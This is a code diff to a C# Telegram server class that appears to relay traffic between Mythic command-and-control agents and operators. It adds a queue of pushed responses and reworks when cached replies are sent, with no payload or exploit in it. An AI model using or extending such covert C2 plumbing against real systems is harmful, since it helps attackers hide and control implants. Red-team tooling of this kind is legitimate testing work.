@@ -114,12 +114,12 @@ internal sealed class TelegramServer : IDisposable
             return;
         }
 
-        CachedResponse? cachedResponse;
+        CachedResponse? responseToSend;
         bool shouldForward;
         lock (route.Sync)
         {
             route.RemoveExpiredResponses();
-            if (route.Responses.TryGetValue(envelope.PacketId, out cachedResponse))
+            if (route.Responses.TryGetValue(envelope.PacketId, out responseToSend))
             {
                 shouldForward = false;
             }
@@ -131,22 +131,26 @@ internal sealed class TelegramServer : IDisposable
             {
                 route.PendingPacketId = envelope.PacketId;
                 shouldForward = true;
+                responseToSend = route.TakePushedResponse();
+                if (responseToSend is not null)
+                {
+                    route.Responses[envelope.PacketId] = responseToSend;
+                    route.TrimResponses();
+                }
             }
-        }
-
-        if (cachedResponse is not null)
-        {
-            await SendPayloadAsync(
-                route.ChatId,
-                envelope.SenderId,
-                envelope.PacketId,
-                cachedResponse.Payload,
-                CancellationToken.None);
-            return;
         }
 
         if (!shouldForward)
         {
+            if (responseToSend is not null)
+            {
+                await SendPayloadAsync(
+                    route.ChatId,
+                    envelope.SenderId,
+                    envelope.PacketId,
+                    responseToSend.Payload,
+                    CancellationToken.None);
+            }
             return;
         }
 
@@ -165,6 +169,16 @@ internal sealed class TelegramServer : IDisposable
             }
             throw;
         }
+
+        if (responseToSend is not null)
+        {
+            await SendPayloadAsync(
+                route.ChatId,
+                envelope.SenderId,
+                envelope.PacketId,
+                responseToSend.Payload,
+                CancellationToken.None);
+        }
     }
 
     private async Task HandleMythicMessageAsync(PushC2MessageFromMythic message)
@@ -175,26 +189,38 @@ internal sealed class TelegramServer : IDisposable
             return;
         }
 
-        string? requestId;
+        string requestId;
+        string payload = message.Message.ToStringUtf8();
+        bool shouldSend = false;
         lock (route.Sync)
         {
-            requestId = route.PendingPacketId;
-            if (requestId is null)
+            requestId = route.PendingPacketId ?? string.Empty;
+            if (route.PendingPacketId is null)
             {
-                return;
+                if (message.Success)
+                {
+                    route.QueuePushedResponse(new CachedResponse(payload));
+                }
             }
-
-            route.PendingPacketId = null;
-            if (message.Success)
+            else
             {
-                route.Responses[requestId] = new CachedResponse(message.Message.ToStringUtf8());
-                route.TrimResponses();
+                route.PendingPacketId = null;
+                if (message.Success && !route.Responses.ContainsKey(requestId))
+                {
+                    route.Responses[requestId] = new CachedResponse(payload);
+                    route.TrimResponses();
+                    shouldSend = true;
+                }
             }
         }
 
         if (!message.Success)
         {
             Console.Error.WriteLine($"Mythic rejected a Telegram message: {message.Error}");
+            return;
+        }
+        if (!shouldSend)
+        {
             return;
         }
 
@@ -204,7 +230,7 @@ internal sealed class TelegramServer : IDisposable
                 route.ChatId,
                 message.TrackingID,
                 requestId,
-                message.Message.ToStringUtf8(),
+                payload,
                 CancellationToken.None);
         }
         catch (Exception exception)
@@ -293,6 +319,30 @@ internal sealed class TelegramServer : IDisposable
         public TimeSpan DisconnectAfter { get; private set; } = TimeSpan.FromMinutes(5);
         public string? PendingPacketId { get; set; }
         public Dictionary<string, CachedResponse> Responses { get; } = new(StringComparer.Ordinal);
+        public Queue<CachedResponse> PushedResponses { get; } = new();
+
+        public void QueuePushedResponse(CachedResponse response)
+        {
+            while (PushedResponses.Count >= MaximumCachedResponses)
+            {
+                PushedResponses.Dequeue();
+            }
+            PushedResponses.Enqueue(response);
+        }
+
+        public CachedResponse? TakePushedResponse()
+        {
+            DateTimeOffset cutoff = DateTimeOffset.UtcNow - CachedResponseLifetime;
+            while (PushedResponses.Count > 0)
+            {
+                CachedResponse response = PushedResponses.Dequeue();
+                if (response.CreatedAt >= cutoff)
+                {
+                    return response;
+                }
+            }
+            return null;
+        }
 
         public void Refresh(string chatId, int sleepSeconds, int jitterPercent)
         {
